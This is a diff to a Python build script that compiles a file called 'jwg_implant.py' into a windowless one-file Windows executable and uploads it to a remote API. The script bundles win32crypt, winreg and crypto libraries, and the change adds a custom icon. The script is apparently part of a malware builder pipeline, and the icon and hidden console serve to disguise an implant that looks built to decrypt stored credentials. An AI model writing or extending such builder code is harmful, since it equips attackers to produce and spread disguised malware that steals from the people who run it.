@@ -61,7 +61,28 @@ def bake_cfg(cfg: dict, repo_root: str) -> str:
     return path
 
 
-def compile_exe(name: str, repo_root: str) -> str | None:
+def write_icon(cfg: dict, repo_root: str) -> str | None:
+    """Decode an optional base64 .ico to app.ico next to the source; return its path."""
+    b64 = (cfg or {}).get("icon_b64") or ""
+    if not b64:
+        return None
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        print("[ci] icon b64 undecodable, ignoring")
+        return None
+    # ICO magic: reserved 0, type 1, count >=1. Reject non-ICO early so PyInstaller
+    # doesn't choke on a PNG/JPEG someone pasted as "icon".
+    if len(raw) < 6 or raw[:4] != b"\x00\x00\x01\x00":
+        print("[ci] file is not a valid .ico header, ignoring icon")
+        return None
+    p = os.path.join(repo_root, "app.ico")
+    open(p, "wb").write(raw)
+    print(f"[ci] wrote custom icon app.ico ({len(raw)} bytes)")
+    return p
+
+
+def compile_exe(name: str, repo_root: str, icon_path: str | None = None) -> str | None:
     """Run PyInstaller onefile on jwg_implant.py; return path to the exe or None."""
     cmd = [
         sys.executable, "-m", "PyInstaller", "--noconfirm", "--onefile", "--noconsole",
@@ -69,8 +90,10 @@ def compile_exe(name: str, repo_root: str) -> str | None:
         "--add-data", f"cfg.json{os.pathsep}.",
         "--hidden-import", "win32crypt", "--hidden-import", "winreg",
         "--collect-submodules", "Cryptodome",
-        os.path.join(repo_root, "jwg_implant.py"),
     ]
+    if icon_path:
+        cmd.append(f"--icon={icon_path}")
+    cmd.append(os.path.join(repo_root, "jwg_implant.py"))
     print("[ci] running:", " ".join(cmd))
     rc = subprocess.call(cmd, cwd=repo_root)
     exe = os.path.join(repo_root, "dist", f"{name}.exe")
@@ -119,7 +142,8 @@ def main(argv=None) -> int:
 
     try:
         bake_cfg(cfg, a.repo_root)
-        exe = compile_exe(name, a.repo_root)
+        icon = write_icon(cfg, a.repo_root)
+        exe = compile_exe(name, a.repo_root, icon)
         if exe:
             upload(api, tok, bid, exe)
             return 0
